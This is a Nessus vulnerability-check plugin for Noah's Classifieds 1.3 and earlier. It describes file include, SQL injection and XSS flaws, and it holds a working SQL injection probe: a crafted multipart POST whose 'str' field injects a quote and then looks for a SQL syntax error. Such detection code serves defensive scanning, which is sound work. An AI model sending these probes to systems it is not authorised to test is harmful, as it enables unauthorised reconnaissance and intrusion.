#
# (C) Tenable Network Security
#


if (description) {
  script_id(20971);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-0879", "CVE-2006-0880", "CVE-2006-0881", "CVE-2006-0882");
  script_bugtraq_id(16772, 16773, 16778, 16780);

  script_name(english:"Noah's Classifieds <= 1.3 Multiple Vulnerabilities");
  script_summary(english:"Checks for search page SQL injection flaw in Noah's Classifieds");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running Noah's Classifieds, a classifieds ads
application written in PHP. 

The installed version of Noah's Classifieds is reportedly affected by
numerous remote and local file include, SQL injection, cross-site
scripting, and information disclosure issues due to a general failure
of the application to sanitize user-supplied input. 

Note that successful exploitation of the file include flaws requires
that PHP's 'register_globals' setting be enabled. 

See also :

http://www.securityfocus.com/archive/1/425783/30/0/threaded

Solution :

Remove the application as it is no longer supported. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/noahsclassifieds", "/classifieds", "/ads", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If the initial page looks like Noah's Classifieds...
  if (egrep(pattern:">Powered by <a [^>]+>Noah's Classifieds</a>", string:res)) {
    # Try to exploit the SQL injection flaw.
    boundary = "nessus";
    req = string(
      # nb: "option=com_noah" is for any Mambo instances 
      "POST ",  dir, "/index.php?option=com_noah HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n",
      'Content-Disposition: form-data; name="method"', "\r\n",
      "\r\n",
      "create\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="list"', "\r\n",
      "\r\n",
      "classifiedssearch\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="fromlist"', "\r\n",
      "\r\n",
      "classifiedscategory\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="frommethod"', "\r\n",
      "\r\n",
      "showhtmllist\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="str"', "\r\n",
      "\r\n",
      "'", SCRIPT_NAME, "\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="cid"', "\r\n",
      "\r\n",
      "0\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="type"', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="submit"', "\r\n",
      "\r\n",
      "Ok\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="id"', "\r\n",
      "\r\n",
      "0\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see a SQL syntax error with our script name.
    #
    # nb: error messages happen even if 'display_errors' is off.
    if (egrep(pattern:string("an error in your SQL syntax.+ near '", SCRIPT_NAME), string:res)) {
      security_warning(port);
    }
  }
}
